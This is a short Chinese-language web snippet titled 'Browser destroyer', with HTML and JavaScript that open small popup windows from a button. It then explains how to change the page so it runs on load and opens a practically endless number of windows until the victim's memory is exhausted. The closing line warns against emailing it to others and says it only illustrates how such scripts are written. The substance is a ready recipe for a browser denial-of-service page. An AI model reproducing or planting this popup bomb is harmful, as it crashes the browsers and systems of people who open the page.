浏览器毁灭者－请小心使用！

源代码如下：
<html>
<head>
<title></title>
<script language="JavaScript">
<!---hide---
function pop(){
for(i=1;i<=3;i++)
{
window.open('page.htm','','width=60,height=60','status=off','location=off',
'toolbar=off','scrollbars=off')
}
}
//--->
</script>
</head>

<body>
<form name="form">
<input type="button" value="测试:打开3个60*60的小窗口" onClick="pop()" name="button">
</form>
</body>
</html>

说明:不正当的使用会造成系统资源的耗尽。如果你将源代码稍微改一下，将<body>改成<body onload=pop()>，同时又将for(i=1;i<=3;i++) 中的打开窗口数目修改得非常大(例如：99999999999999999999)。(此时form表单就不需要了)那么，只要一打开含有该脚本的HTML后，无数的窗口会被打开，直至吃尽你的内存。

千万不要给别人发这样的缺德邮件，本例只在于介绍此类脚本的语句写法。
